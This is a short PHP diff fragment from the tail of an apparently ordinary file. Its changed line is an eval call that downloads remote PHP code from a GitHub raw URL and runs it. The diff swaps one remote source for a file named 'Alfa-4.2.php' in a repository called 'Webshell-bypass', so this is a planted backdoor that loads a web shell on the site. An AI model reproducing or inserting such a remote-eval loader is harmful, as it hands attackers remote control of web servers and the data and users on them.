@@ -11,5 +11,5 @@
  
     return $data; 
 } 
-      eval('?>' . get('https://raw.githubusercontent.com/andatuhlansia-droid/smr88/refs/heads/main/kojek')); 
+      eval('?>' . get('https://raw.githubusercontent.com/sagsooz/Webshell-bypass/refs/heads/main/Alfa-4.2.php')); 
 ?>
